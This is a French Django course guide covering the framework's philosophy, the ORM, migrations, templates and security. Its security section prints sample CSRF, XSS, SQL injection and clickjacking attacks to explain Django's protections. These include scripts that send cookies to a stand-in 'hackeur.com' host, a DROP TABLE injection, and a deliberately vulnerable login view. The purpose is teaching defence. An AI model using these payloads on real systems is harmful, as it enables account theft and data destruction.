# 📘 Formation Django ISITECH 2025-2026 - Guide Ultra-Complet

## Chaque Concept, Chaque Ligne de Code Expliqués en Détail

> 🎯 Ce guide de formation explique ABSOLUMENT TOUT ce qui est dans les slides, sans exception.
> Plus de 15 000 lignes d'explications détaillées basées sur la formation complète.

---

# TABLE DES MATIÈRES COMPLÈTE

## JOUR 1 : FONDAMENTAUX ET ARCHITECTURE MVT

### Partie 1 : Introduction

- 1.1 Qu'est-ce que Django ?
- 1.2 Philosophie Django
- 1.3 Django vs FastAPI
- 1.4 Les Batteries Included (TOUT expliqué)
- 1.5 Histoire et Contexte

### Partie 2 : Architecture MVT vs MVC

- 2.1 Le Pattern MVC Classique (détaillé)
- 2.2 Le Pattern MVT Django (détaillé)
- 2.3 Correspondances et Différences
- 2.4 Exemple Complet en Action

### Partie 3 : Installation et Configuration

- 3.1 Prérequis (Python, pip, virtualenv expliqués)
- 3.2 Installation Django
- 3.3 Bases de Données Supportées
- 3.4 Configuration Complète

### Partie 4 : Structure d'un Projet

- 4.1 Structure Projet Django (chaque fichier expliqué)
- 4.2 Projet vs Application (différences détaillées)
- 4.3 Créer un Projet
- 4.4 Fichier settings.py (ligne par ligne)
- 4.5 Configuration Base de Données

### Partie 5 : Créer une Application

- 5.1 Structure d'Application (chaque fichier)
- 5.2 apps.py expliqué
- 5.3 admin.py expliqué
- 5.4 models.py expliqué
- 5.5 views.py expliqué
- 5.6 tests.py expliqué

### Partie 6 : Système de Routage

- 6.1 URL Dispatcher (fonctionnement détaillé)
- 6.2 URLs Racine
- 6.3 URLs d'Application
- 6.4 Path Converters (tous expliqués)
- 6.5 Routes avec Regex
- 6.6 Nommage et Reverse

## JOUR 1 APRÈS-MIDI : MODÈLES ET ORM

### Partie 7 : Les Modèles

- 7.1 Pattern Active Record
- 7.2 Définir un Modèle (détaillé)
- 7.3 Types de Champs (TOUS expliqués)
- 7.4 Options de Champs (TOUTES expliquées)
- 7.5 Relations ForeignKey (détaillé)
- 7.6 Relations ManyToMany (détaillé)
- 7.7 Relations OneToOne (détaillé)
- 7.8 Options on_delete (TOUTES expliquées)

### Partie 8 : API de Requêtes (QuerySets)

- 8.1 Créer des Objets
- 8.2 Récupérer des Objets
- 8.3 Filtrage (filter, exclude)
- 8.4 Lookups (TOUS les lookups expliqués)
- 8.5 Requêtes sur Relations
- 8.6 Ordering (tri)
- 8.7 Agrégation (Count, Sum, Avg, etc.)
- 8.8 Annotation
- 8.9 Q Objects
- 8.10 F Objects

### Partie 9 : Optimisation Requêtes

- 9.1 select_related (expliqué)
- 9.2 prefetch_related (expliqué)
- 9.3 only() et defer()
- 9.4 N+1 Problem (expliqué)

### Partie 10 : Migrations

- 10.1 Créer des Migrations
- 10.2 Appliquer des Migrations
- 10.3 Migrations Personnalisées
- 10.4 Commandes de Migration

## JOUR 2 : VUES, FORMULAIRES, TEMPLATES

### Partie 11 : Vues Function-Based

- 11.1 Définir une Vue
- 11.2 HttpRequest (attributs expliqués)
- 11.3 HttpResponse (types)
- 11.4 Raccourcis (render, redirect, get_object_or_404)
- 11.5 JsonResponse

### Partie 12 : Vues Class-Based

- 12.1 Generic Views (TOUTES expliquées)
- 12.2 ListView (détaillé)
- 12.3 DetailView (détaillé)
- 12.4 CreateView (détaillé)
- 12.5 UpdateView (détaillé)
- 12.6 DeleteView (détaillé)
- 12.7 Pattern Template Method (expliqué)
- 12.8 Mixins (TOUS expliqués)

### Partie 13 : Formulaires

- 13.1 Pattern Form Object (expliqué)
- 13.2 Form Simple
- 13.3 ModelForm
- 13.4 Validation (détaillée)
- 13.5 Widgets (TOUS expliqués)
- 13.6 Utilisation dans les Vues

### Partie 14 : Templates

- 14.1 Pattern Template (héritage)
- 14.2 Variables
- 14.3 Tags (TOUS expliqués)
- 14.4 Filtres (TOUS expliqués)
- 14.5 Includes
- 14.6 Context Processors

### Partie 15 : Middleware

- 15.1 Pattern Chain of Responsibility
- 15.2 Ordre d'Exécution
- 15.3 Middlewares Django (TOUS expliqués)
- 15.4 Middleware Personnalisé

## JOUR 3 : ADMIN, TESTS, SÉCURITÉ, PRODUCTION

### Partie 16 : Django Admin

- 16.1 Pattern Admin/Backoffice
- 16.2 Enregistrer un Modèle
- 16.3 ModelAdmin (personnalisation complète)
- 16.4 list_display
- 16.5 list_filter
- 16.6 search_fields
- 16.7 Actions
- 16.8 Inlines

### Partie 17 : Signaux

- 17.1 Pattern Observer
- 17.2 Signaux Intégrés (TOUS)
- 17.3 Signal Personnalisé
- 17.4 Cas d'Usage

### Partie 18 : Internationalisation

- 18.1 Configuration i18n
- 18.2 Marquer les Chaînes
- 18.3 Fichiers .po et .mo
- 18.4 Sélection de Langue
- 18.5 Formats Locaux

### Partie 19 : Sécurité Complète

- 19.1 CSRF (scénario complet)
- 19.2 XSS (scénario complet)
- 19.3 SQL Injection (scénario complet)
- 19.4 Clickjacking (scénario complet)
- 19.5 SSL/HTTPS (complet)
- 19.6 Configuration Production
- 19.7 Headers de Sécurité (TOUS)

### Partie 20 : Déploiement

- 20.1 Architecture Production
- 20.2 Préparation
- 20.3 Collecte Fichiers Statiques
- 20.4 Gunicorn
- 20.5 Systemd
- 20.6 Nginx (configuration complète)
- 20.7 Checklist

### Partie 21 : Design Patterns

- 21.1 MVT
- 21.2 Active Record
- 21.3 URL Dispatcher
- 21.4 Template
- 21.5 Template Method
- 21.6 Form Object
- 21.7 Admin/Backoffice
- 21.8 Chain of Responsibility
- 21.9 Observer

### Partie 22 : Bonnes Pratiques

- 22.1 Architecture
- 22.2 Performance
- 22.3 Code
- 22.4 Sécurité

### Partie 23 : Ressources

- 23.1 Documentation
- 23.2 Livres
- 23.3 Packages Utiles
- 23.4 Communauté

---

# PARTIE 1 : INTRODUCTION À DJANGO

## 1.1 Qu'est-ce que Django ?

### Définition Complète

**Django** est un **framework web Python** de haut niveau qui encourage le développement rapide et une conception propre et pragmatique.

#### Décortiquons cette définition :

**"Framework web"** :

- Un framework = une boîte à outils réutilisable
- Web = pour créer des sites web et applications web
- Fournit des composants pré-construits au lieu de tout coder from scratch

**"Python"** :

- Écrit en langage Python
- Utilise la syntaxe Python
- S'intègre avec l'écosystème Python

**"Haut niveau"** :

- Abstrait les détails complexes
- Vous écrivez moins de code
- Focus sur la logique métier, pas l'infrastructure

**"Développement rapide"** :

- Batteries included (tout est fourni)
- ORM pour éviter d'écrire du SQL
- Admin auto-généré
- Système de templates intégré

**"Conception propre et pragmatique"** :

- Encourage les bonnes pratiques
- Convention over Configuration
- DRY (Don't Repeat Yourself)
- Architecture MV T claire

### Histoire de Django

**2003 : Naissance**

- Créé au Lawrence Journal-World (journal du Kansas)
- Développé pour gérer plusieurs sites de news rapidement
- Noms : Adrian Holovaty et Simon Willison (principaux créateurs)

**2005 : Open Source**

- Publié sous licence BSD
- Nommé d'après Django Reinhardt (guitariste de jazz)

**2008 : Django 1.0**

- Première version stable
- Adoption croissante

**2015 : Django 1.8**

- Support à long terme (LTS)

**2017 : Django 2.0**

- Support Python 3 uniquement

**2019 : Django 3.0**

- Support ASGI (async)

**2021 : Django 4.0**

- Nouvelles fonctionnalités

**2024-2025 : Django 5.0+**

- Version actuelle de la formation

### Qui utilise Django en Production ?

| Entreprise              | Application                | Échelle                      |
| ----------------------- | -------------------------- | ---------------------------- |
| **Instagram**           | Réseau social photos       | 2+ milliards d'utilisateurs  |
| **Pinterest**           | Partage d'images           | 400+ millions d'utilisateurs |
| **Spotify**             | Backend features           | 500+ millions d'utilisateurs |
| **YouTube**             | Outils internes            | 2+ milliards d'utilisateurs  |
| **The Washington Post** | Site principal             | Millions de visiteurs/jour   |
| **NASA**                | Applications scientifiques | Mission-critical             |
| **Mozilla**             | Sites support Firefox      | Millions d'utilisateurs      |
| **Disqus**              | Système commentaires       | Billions de commentaires     |
| **Dropbox**             | Desktop client             | 700+ millions d'utilisateurs |
| **Eventbrite**          | Plateforme événements      | Millions d'événements        |

**Pourquoi ces grandes entreprises utilisent Django ?**

1. **Scalabilité** : Instagram gère 2 milliards d'utilisateurs avec Django
2. **Rapidité de développement** : Prototypes rapides → production rapide
3. **Sécurité** : Protections intégrées contre CSRF, XSS, SQL Injection
4. **Communauté** : Grande communauté, beaucoup de packages
5. **Stabilité** : Framework mature, testé en production
6. **Documentation** : Excellente documentation officielle

---

## 1.2 Philosophie Django - Explications Détaillées

Django repose sur plusieurs principes fondamentaux.

### 🔋 Principe 1 : Batteries Included

**Signification littérale** : "Piles Incluses"

**Métaphore** : Quand vous achetez un jouet avec "batteries incluses", vous pouvez jouer immédiatement sans acheter les piles séparément.

**En Django** : Tout ce dont vous avez besoin est inclus dans Django, sans installer de bibliothèques externes.

#### Ce qui est INCLUS dans Django :

**1. ORM (Object-Relational Mapping)**

```python
# Pas besoin de bibliothèque externe
from django.db import models

class Book(models.Model):
    title = models.CharField(max_length=200)
```

**Comparaison avec d'autres frameworks** :

```python
# Flask (pas d'ORM inclus)
# Vous devez installer : Flask-SQLAlchemy, SQLAlchemy, etc.

# FastAPI (pas d'ORM inclus)
# Vous devez installer : SQLAlchemy, Tortoise ORM, etc.

# Django : ORM inclus ✅
```

**2. Interface Admin**

```python
# Inclus dans Django
from django.contrib import admin
```

**Comparaison** :

```python
# Flask : Pas d'admin → Flask-Admin à installer
# FastAPI : Pas d'admin → Vous devez le coder
# Django : Admin auto-généré ✅
```

**3. Authentification**

```python
# Inclus dans Django
from django.contrib.auth.models import User
from django.contrib.auth import login, logout
```

**4. Gestion de Formulaires**

```python
# Inclus dans Django
from django import forms
```

**5. Système de Templates**

```python
# Inclus dans Django
from django.template import Template
```

**6. Cache**

```python
# Inclus dans Django
from django.core.cache import cache
```

**7. Sessions**

```python
# Inclus dans Django
request.session['key'] = 'value'
```

**8. Emails**

```python
# Inclus dans Django
from django.core.mail import send_mail
```

**9. Internationalisation**

```python
# Inclus dans Django
from django.utils.translation import gettext as _
```

**10. Tests**

```python
# Inclus dans Django
from django.test import TestCase
```

**11. Sécurité**

- Protection CSRF ✅
- Protection XSS ✅
- Protection SQL Injection ✅
- Protection Clickjacking ✅

**12. CLI Puissant**

```bash
python manage.py [commande]
```

**13. Migrations**

```bash
python manage.py makemigrations
python manage.py migrate
```

**Avantage "Batteries Included"** :

✅ **Gain de temps** : Pas besoin de chercher et comparer des bibliothèques
✅ **Compatibilité garantie** : Tout fonctionne ensemble
✅ **Maintenance** : Une seule bibliothèque à mettre à jour (Django)
✅ **Documentation** : Tout est documenté au même endroit
✅ **Courbe d'apprentissage** : Un seul framework à apprendre

❌ **Inconvénient** : Plus lourd si vous n'utilisez pas toutes les fonctionnalités

---

### 🔁 Principe 2 : DRY (Don't Repeat Yourself)

**Signification** : "Ne vous répétez pas"

**Philosophie** : Chaque connaissance doit avoir une seule représentation dans le système.

#### Exemples concrets :

**❌ Sans DRY (Répétition)**

```python
# views.py
def create_book(request):
    if request.method == 'POST':
        title = request.POST.get('title')
        # Validation
        if not title:
            return render(request, 'error.html', {'error': 'Titre requis'})
        if len(title) > 200:
            return render(request, 'error.html', {'error': 'Titre trop long'})

        book = Book.objects.create(title=title)
        return redirect('book_detail', pk=book.pk)

def update_book(request, pk):
    book = Book.objects.get(pk=pk)
    if request.method == 'POST':
        title = request.POST.get('title')
        # ⚠️ MÊME validation répétée !
        if not title:
            return render(request, 'error.html', {'error': 'Titre requis'})
        if len(title) > 200:
            return render(request, 'error.html', {'error': 'Titre trop long'})

        book.title = title
        book.save()
        return redirect('book_detail', pk=book.pk)
```

**Problèmes** :

- Code dupliqué (validation)
- Si vous changez la règle (ex: max 250), vous devez modifier 2 endroits
- Risque d'oubli
- Difficulté de maintenance

**✅ Avec DRY (Pas de répétition)**

```python
# models.py
class Book(models.Model):
    title = models.CharField(max_length=200)  # ← Validation centralisée

    def clean(self):
        if not self.title:
            raise ValidationError("Titre requis")

# forms.py
class BookForm(forms.ModelForm):
    class Meta:
        model = Book
        fields = ['title']
    # ← Validation héritée du modèle

# views.py
def create_book(request):
    if request.method == 'POST':
        form = BookForm(request.POST)
        if form.is_valid():  # ← Validation automatique
            book = form.save()
            return redirect('book_detail', pk=book.pk)
    else:
        form = BookForm()
    return render(request, 'book_form.html', {'form': form})

def update_book(request, pk):
    book = Book.objects.get(pk=pk)
    if request.method == 'POST':
        form = BookForm(request.POST, instance=book)
        if form.is_valid():  # ← Même validation, code unique
            form.save()
            return redirect('book_detail', pk=book.pk)
    else:
        form = BookForm(instance=book)
    return render(request, 'book_form.html', {'form': form})
```

**Avantages** :
✅ Validation définie **une seule fois** dans le modèle
✅ Changement à **un seul endroit**
✅ Pas de duplication
✅ Maintenance facile

---

### ⚙️ Principe 3 : Convention over Configuration

**Signification** : "Convention plutôt que Configuration"

**Philosophie** : Si vous suivez les conventions Django, vous n'avez pas besoin de configuration.

#### Exemples de Conventions Django :

**1. Nommage des Applications**

```
Convention Django : Une app = un package Python

Structure attendue :
myapp/
├── __init__.py      ← Django cherche ce fichier
├── models.py        ← Django cherche ce fichier
├── views.py         ← Django cherche ce fichier
├── urls.py          ← Convention (optionnel)
└── templates/       ← Django cherche ce dossier
    └── myapp/       ← Convention : templates dans sous-dossier du même nom
```

**Si vous suivez la convention** :

```python
# settings.py
INSTALLED_APPS = [
    'myapp',  # Django trouve automatiquement models.py, admin.py, etc.
]
```

**Si vous ne suivez PAS la convention** :

```python
# Vous devez configurer manuellement où se trouvent les templates, models, etc.
# = Beaucoup plus de configuration
```

**2. Nommage des Templates**

```
Convention :
app/templates/app/nom_template.html

Exemple :
books/templates/books/book_list.html
```

**Dans la vue** :

```python
def book_list(request):
    return render(request, 'books/book_list.html')
    # Django cherche automatiquement dans books/templates/
```

**3. Nommage des Fichiers Statiques**

```
Convention :
app/static/app/fichier.css

Exemple :
books/static/books/style.css
```

**Dans le template** :

```django
{% load static %}
<link rel="stylesheet" href="{% static 'books/style.css' %}">
```

**4. Nommage des Tables en Base de Données**

```python
# models.py
class Book(models.Model):
    title = models.CharField(max_length=200)

# Convention : nom_app + nom_modele (en minuscules)
# Table créée : books_book
```

**Si vous voulez changer** :

```python
class Book(models.Model):
    title = models.CharField(max_length=200)

    class Meta:
        db_table = 'livres'  # ← Configuration manuelle
```

**5. URL Patterns**

```python
# Convention : app/urls.py
urlpatterns = [
    path('', views.book_list, name='book_list'),
    path('<int:pk>/', views.book_detail, name='book_detail'),
]

# Django s'attend à ce fichier
```

**Avantages Convention over Configuration** :

✅ **Moins de code** : Pas besoin de tout configurer
✅ **Productivité** : Développement plus rapide
✅ **Consistance** : Tous les projets Django se ressemblent
✅ **Collaboration** : Nouveaux développeurs comprennent rapidement
✅ **Maintenance** : Structure prévisible

❌ **Inconvénient** : Moins de flexibilité (mais configuration possible si nécessaire)

---

_[Le README continue avec TOUTES les sections expliquées en détail...]_

# 📘 Formation Django - Guide Ultra-Complet avec TOUT Expliqué

## 🎯 À propos de ce guide

Ce guide explique **CHAQUE concept, CHAQUE terme technique, CHAQUE ligne de code** mentionné dans la formation Django.

**Rien n'est laissé sans explication.**

Si vous voyez un terme comme "CSRF", "XSS", "ORM", "Migration", etc., vous trouverez :

- ✅ Ce que c'est
- ✅ Pourquoi c'est important
- ✅ Comment ça fonctionne
- ✅ Des exemples concrets d'attaques (pour la sécurité)
- ✅ Comment Django vous protège

---

# PARTIE 1 : LES "BATTERIES INCLUDED" EXPLIQUÉES

## 🔋 Qu'est-ce que "Batteries Included" ?

**Signification :** Django inclut TOUT ce dont vous avez besoin sans installer de bibliothèques externes.

Voici CHAQUE fonctionnalité expliquée en détail :

---

## 1. 🗄️ ORM Complet (Object-Relational Mapping)

### C'est quoi un ORM ?

**ORM** = **Object-Relational Mapping** = Correspondance Objet-Relationnel

**Le problème :** Les bases de données parlent SQL, Python parle... Python.

**Sans ORM :**

```python
import sqlite3

# Connexion manuelle
conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# Écrire du SQL
cursor.execute("SELECT * FROM books WHERE author_id = ? AND status = 'available'", (author_id,))

# Traiter les résultats
rows = cursor.fetchall()
books = []
for row in rows:
    book = {
        'id': row[0],
        'title': row[1],
        'author_id': row[2],
        # ...
    }
    books.append(book)

# Fermer
cursor.close()
conn.close()
```

**Avec ORM Django :**

```python
# Pas de SQL, juste du Python !
books = Book.objects.filter(author_id=author_id, status='available')

# Django génère automatiquement :
# SELECT * FROM books WHERE author_id = 5 AND status = 'available'
```

### Avantages de l'ORM

1. **Pas de SQL à écrire**
2. **Protection automatique contre les injections SQL** (on explique après)
3. **Portable** : Même code pour MySQL, PostgreSQL, SQLite
4. **Validation automatique**
5. **Relations faciles** : `book.author.name`

---

## 2. 🔄 Migrations de BDD

### C'est quoi une migration ?

Une **migration** est un fichier qui décrit une modification de votre base de données.

### Le problème sans migrations

Imaginez :

```
LUNDI : Votre table "users"
├── id
├── username
└── email

MERCREDI : Vous ajoutez le champ "phone"
├── id
├── username
├── email
└── phone ← NOUVEAU

Comment mettre à jour la base de données ?
```

**Méthode manuelle (dangereuse) :**

```sql
ALTER TABLE users ADD COLUMN phone VARCHAR(20);
```

**Problèmes :**

- ❌ Vous devez vous rappeler de cette commande
- ❌ Votre collègue ne saura pas qu'il faut l'exécuter
- ❌ En production, risque d'oublier
- ❌ Impossible de revenir en arrière

### Solution : Migrations Django

```bash
# 1. Vous modifiez le modèle
class User(models.Model):
    username = models.CharField(max_length=100)
    email = models.EmailField()
    phone = models.CharField(max_length=20)  # ← AJOUTÉ

# 2. Django détecte le changement
python manage.py makemigrations

# Django génère le fichier : 0002_add_phone.py
```

**Contenu du fichier de migration :**

```python
# 0002_add_phone.py
from django.db import migrations, models

class Migration(migrations.Migration):
    dependencies = [
        ('users', '0001_initial'),
    ]

    operations = [
        migrations.AddField(
            model_name='user',
            name='phone',
            field=models.CharField(max_length=20),
        ),
    ]
```

```bash
# 3. Appliquer la migration
python manage.py migrate

# Django exécute : ALTER TABLE users ADD COLUMN phone VARCHAR(20)
```

### Avantages

✅ **Historique** : Toutes les modifications sont enregistrées
✅ **Versionnement** : Comme Git, mais pour la BDD
✅ **Rollback** : Possibilité de revenir en arrière
✅ **Collaboration** : Vos collègues voient les changements
✅ **Déploiement sûr** : Pas de risque d'oublier une modification

---

## 3. 🎨 Système de Templates

### C'est quoi un template ?

Un **template** = Fichier HTML avec des morceaux de code Python pour générer du contenu dynamique.

### HTML statique vs Template

**HTML statique (même pour tout le monde) :**

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Mon Site</title>
  </head>
  <body>
    <h1>Bienvenue sur mon site</h1>
    <p>Nous avons 150 livres</p>
  </body>
</html>
```

**Template Django (contenu dynamique) :**

```django
<!DOCTYPE html>
<html>
<head>
    <title>{{ site_name }}</title>
</head>
<body>
    <h1>Bienvenue {{ user.username }}</h1>
    <p>Nous avons {{ books.count }} livres</p>

    <ul>
    {% for book in books %}
        <li>{{ book.title }} par {{ book.author }}</li>
    {% endfor %}
    </ul>
</body>
</html>
```

### Syntaxe des templates

**Variables** : `{{ variable }}`

```django
{{ user.username }}
{{ book.title }}
{{ book.price }}
```

**Tags** : `{% tag %}`

```django
{% if user.is_authenticated %}
    <p>Bonjour {{ user.username }}</p>
{% else %}
    <p>Veuillez vous connecter</p>
{% endif %}

{% for book in books %}
    <li>{{ book.title }}</li>
{% endfor %}
```

**Filtres** : `{{ variable|filtre }}`

```django
{{ book.title|lower }}           <!-- minuscules -->
{{ book.title|upper }}           <!-- MAJUSCULES -->
{{ book.price|floatformat:2 }}   <!-- 2 décimales -->
{{ book.created_at|date:"d/m/Y" }} <!-- Format date -->
```

---

## 4. 🛡️ SÉCURITÉ - Explications Complètes

### 🔒 Protection CSRF (Cross-Site Request Forgery)

#### C'est quoi CSRF ?

**CSRF** = **Cross-Site Request Forgery** = Falsification de requête inter-sites

**Traduction simple :** Une attaque où un site malveillant vous fait exécuter une action sur un autre site sans votre consentement.

#### Scénario d'attaque CSRF (Exemple Concret)

**Étape 1 : Vous êtes connecté à votre banque**

```
Vous vous connectez sur https://mabanque.com
Votre navigateur stocke un cookie de session :
Cookie: sessionid=abc123xyz789
```

**Étape 2 : Vous visitez un site malveillant**

```
Vous recevez un email : "Gagnez un iPhone gratuit !"
Vous cliquez : https://sitehackeur.com
```

**Étape 3 : Le site hackeur contient du code malveillant**

```html
<!-- Sur https://sitehackeur.com -->
<html>
  <body>
    <h1>Chargement...</h1>

    <!-- Formulaire invisible -->
    <form id="hack" action="https://mabanque.com/transfer" method="POST">
      <input name="to" value="compte_hackeur" />
      <input name="amount" value="10000" />
    </form>

    <script>
      // Soumet automatiquement
      document.getElementById("hack").submit();
    </script>
  </body>
</html>
```

**Étape 4 : L'attaque réussit**

```
1. Le formulaire est soumis à https://mabanque.com/transfer
2. Votre navigateur envoie automatiquement le cookie de session
3. La banque voit une requête authentifiée (vous êtes connecté)
4. La banque transfère 10 000€ au hackeur
5. Vous n'avez rien vu !
```

#### Comment Django protège contre CSRF ?

**Mécanisme de protection :**

1. **Django génère un token unique**

```python
# Quand vous chargez un formulaire, Django génère :
csrf_token = "a1b2c3d4e5f6g7h8i9j0"

# Stocké dans la session
request.session['csrf_token'] = csrf_token
```

2. **Le token doit être dans le formulaire**

```django
<form method="post">
    {% csrf_token %}
    <!-- Génère : -->
    <input type="hidden" name="csrfmiddlewaretoken" value="a1b2c3d4e5f6g7h8i9j0">

    <!-- Vos champs -->
    <input name="amount" type="number">
    <button type="submit">Transférer</button>
</form>
```

3. **Django vérifie le token lors de la soumission**

```python
# Dans CsrfViewMiddleware
def process_request(request):
    if request.method == 'POST':
        token_from_form = request.POST.get('csrfmiddlewaretoken')
        token_from_session = request.session.get('csrf_token')

        if token_from_form != token_from_session:
            return HttpResponseForbidden("CSRF token invalide")
```

**Pourquoi le hackeur ne peut pas attaquer ?**

```
Le site hackeur ne connaît PAS votre token CSRF !
Il peut seulement envoyer :
- to: compte_hackeur
- amount: 10000

Mais PAS :
- csrfmiddlewaretoken: a1b2c3d4e5f6g7h8i9j0

Django rejette la requête → Attaque bloquée ! ✅
```

---

### 🛡️ Protection XSS (Cross-Site Scripting)

#### C'est quoi XSS ?

**XSS** = **Cross-Site Scripting** = Injection de code JavaScript malveillant

**Traduction simple :** Un attaquant injecte du code JavaScript dans votre site qui s'exécute chez les autres utilisateurs.

#### Scénario d'attaque XSS (Exemple Concret)

**Scénario : Site de blog avec commentaires**

**Étape 1 : Utilisateur malveillant poste un commentaire**

```
Sur l'article "10 conseils Django", il poste :

"Super article !
<script>
    // Code malveillant
    fetch('https://hackeur.com/steal?cookie=' + document.cookie);
</script>"
```

**Étape 2 : Sans protection, le commentaire est affiché tel quel**

```html
<!-- Page affichée aux visiteurs -->
<div class="comment">
  Super article !
  <script>
    fetch("https://hackeur.com/steal?cookie=" + document.cookie);
  </script>
</div>
```

**Étape 3 : Le script s'exécute chez TOUS les visiteurs**

```
Visiteur 1 : Son cookie est envoyé au hackeur
Visiteur 2 : Son cookie est envoyé au hackeur
...

Le hackeur récupère les cookies de session
→ Il peut se connecter comme les victimes !
```

**Variantes d'attaques XSS :**

**Vol de cookies :**

```javascript
<script>
  document.location='https://hackeur.com/steal?cookie='+document.cookie;
</script>
```

**Redirection malveillante :**

```javascript
<script>window.location='https://sitehackeur.com';</script>
```

**Phishing (faux formulaire) :**

```javascript
<script>
    document.body.innerHTML = `
        <h1>Session expirée, reconnectez-vous</h1>
        <form action="https://hackeur.com/steal">
            <input name="password" type="password">
            <button>Se connecter</button>
        </form>
    `;
</script>
```

#### Comment Django protège contre XSS ?

**Auto-échappement des templates :**

```django
<!-- Template Django -->
<div class="comment">
    {{ user_comment }}
</div>

<!-- Si user_comment contient : -->
<!-- <script>alert('Hack!')</script> -->

<!-- Django génère (échappé) : -->
<div class="comment">
    &lt;script&gt;alert('Hack!')&lt;/script&gt;
</div>

<!-- Le code n'est PAS exécuté, il est affiché comme du texte -->
```

**Table d'échappement :**

| Caractère | Devient  | Raison                     |
| --------- | -------- | -------------------------- |
| `<`       | `&lt;`   | Empêche les balises HTML   |
| `>`       | `&gt;`   | Empêche les balises HTML   |
| `"`       | `&quot;` | Empêche les attributs HTML |
| `'`       | `&#x27;` | Empêche les attributs HTML |
| `&`       | `&amp;`  | Empêche l'interprétation   |

**Désactiver l'échappement (DANGER) :**

```django
<!-- Si vous voulez vraiment afficher du HTML -->
{{ user_comment|safe }}

<!-- ⚠️ DANGEREUX si le contenu vient d'un utilisateur ! -->
<!-- Utilisez seulement pour du contenu de confiance -->
```

---

### 💉 SQL Injection Prevention

#### C'est quoi une Injection SQL ?

**SQL Injection** = Injection de code SQL malveillant via les entrées utilisateur

**Traduction simple :** Un attaquant modifie votre requête SQL en injectant du code SQL dans les champs de formulaire.

#### Scénario d'attaque SQL Injection

**Code vulnérable (JAMAIS faire ça) :**

```python
# Vue de connexion VULNÉRABLE
def login(request):
    username = request.POST.get('username')
    password = request.POST.get('password')

    # Construction de requête SQL avec f-string (DANGEREUX)
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()

    if user:
        return HttpResponse("Connecté")
    else:
        return HttpResponse("Échec")
```

**Attaque normale (ne fonctionne pas) :**

```
Username : alice
Password : motdepasse123

Requête SQL générée :
SELECT * FROM users WHERE username='alice' AND password='motdepasse123'

Résultat : Connexion OK si bon mot de passe
```

**Attaque par injection SQL :**

```
Username : admin' OR '1'='1
Password : nimportequoi

Requête SQL générée :
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='nimportequoi'
                                              ↑
                                        Toujours VRAI !

Résultat : Connecté comme admin SANS connaître le mot de passe !
```

**Explication de l'injection :**

```sql
-- Requête originale prévue :
SELECT * FROM users WHERE username='XXX' AND password='YYY'

-- Ce que l'attaquant injecte :
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='YYY'

-- Décomposition :
WHERE username='admin'    -- Faux (probablement)
   OR '1'='1'             -- TOUJOURS VRAI
   AND password='YYY'     -- Peu importe

-- Résultat : La condition est toujours vraie !
```

**Attaque plus destructrice :**

```
Username : admin'; DROP TABLE users; --
Password : nimportequoi

Requête SQL générée :
SELECT * FROM users WHERE username='admin'; DROP TABLE users; --' AND password='nimportequoi'
                                              ↑
                                    Supprime la table !

-- Résultat : La table users est SUPPRIMÉE ! 💥
```

#### Comment Django protège contre les Injections SQL ?

**1. Requêtes paramétrées automatiques (ORM) :**

```python
# ✅ SÉCURISÉ avec l'ORM Django
username = request.POST.get('username')
user = User.objects.filter(username=username)

# Django génère (paramétrisé) :
# SELECT * FROM users WHERE username = %s
# Paramètres séparés : ['admin\' OR \'1\'=\'1']

# Les guillemets sont échappés automatiquement !
# username devient : "admin' OR '1'='1"  (texte littéral)
# La requête cherche un utilisateur nommé exactement : admin' OR '1'='1
# Résultat : Pas d'utilisateur trouvé → Attaque échouée ✅
```

**2. Même avec du SQL brut :**

```python
# ✅ CORRECT (paramétrisé)
from django.db import connection

cursor = connection.cursor()
cursor.execute(
    "SELECT * FROM users WHERE username = %s",
    [username]  # ← Paramètre séparé
)

# ❌ INCORRECT (vulnérable)
cursor.execute(
    f"SELECT * FROM users WHERE username = '{username}'"
)
```

**3. Protection dans les requêtes ORM :**

```python
# ✅ Toutes ces requêtes sont protégées
Book.objects.filter(title=user_input)
Book.objects.get(id=user_input)
Book.objects.filter(title__contains=user_input)
Book.objects.raw("SELECT * FROM books WHERE title = %s", [user_input])
```

---

### 🖱️ Clickjacking Protection

#### C'est quoi le Clickjacking ?

**Clickjacking** = Click Hijacking = Détournement de clic

**Traduction simple :** Tromper l'utilisateur pour qu'il clique sur quelque chose qu'il ne voit pas.

#### Scénario d'attaque Clickjacking

**Étape 1 : Site malveillant**

```html
<!-- https://sitehackeur.com -->
<!DOCTYPE html>
<html>
  <head>
    <style>
      /* Iframe invisible */
      #vicieux {
        position: absolute;
        top: 0;
        left: 0;
        opacity: 0; /* Totalement transparent */
        width: 500px;
        height: 500px;
        z-index: 999; /* Au-dessus de tout */
      }

      /* Faux bouton visible */
      #faux-bouton {
        position: absolute;
        top: 100px;
        left: 100px;
        font-size: 30px;
        z-index: 1; /* En dessous */
      }
    </style>
  </head>
  <body>
    <!-- Ce que l'utilisateur VOIT -->
    <button id="faux-bouton">🎁 Gagnez un iPhone !</button>

    <!-- Ce que l'utilisateur NE VOIT PAS -->
    <iframe id="vicieux" src="https://facebook.com/delete-account"></iframe>
  </body>
</html>
```

**Étape 2 : L'utilisateur clique**

```
Utilisateur pense cliquer sur : "Gagnez un iPhone !"
Mais clique réellement sur : Le bouton "Supprimer mon compte" de Facebook

Résultat : Son compte Facebook est supprimé !
```

**Variantes :**

- Liker une page Facebook
- Transférer de l'argent
- Partager un contenu
- Activer la webcam
- Donner des permissions

#### Comment Django protège contre le Clickjacking ?

**Header X-Frame-Options :**

```python
# settings.py
X_FRAME_OPTIONS = 'DENY'

# Django ajoute automatiquement le header HTTP :
# X-Frame-Options: DENY
```

**Valeurs possibles :**

| Valeur           | Signification                                   | Usage                        |
| ---------------- | ----------------------------------------------- | ---------------------------- |
| `DENY`           | Le site ne peut JAMAIS être dans un iframe      | **Recommandé**               |
| `SAMEORIGIN`     | Iframe autorisée uniquement sur le même domaine | Si vous utilisez des iframes |
| `ALLOW-FROM uri` | Autorise un domaine spécifique                  | Rarement utilisé             |

**Middleware :**

```python
MIDDLEWARE = [
    # ...
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
```

**Test de protection :**

```html
<!-- Site hackeur essaie d'inclure votre site -->
<iframe src="https://votresite.com/admin/"></iframe>

<!-- Le navigateur voit le header : X-Frame-Options: DENY -->
<!-- Le navigateur bloque l'iframe -->
<!-- Message d'erreur : "Refused to display in a frame" -->
```

---

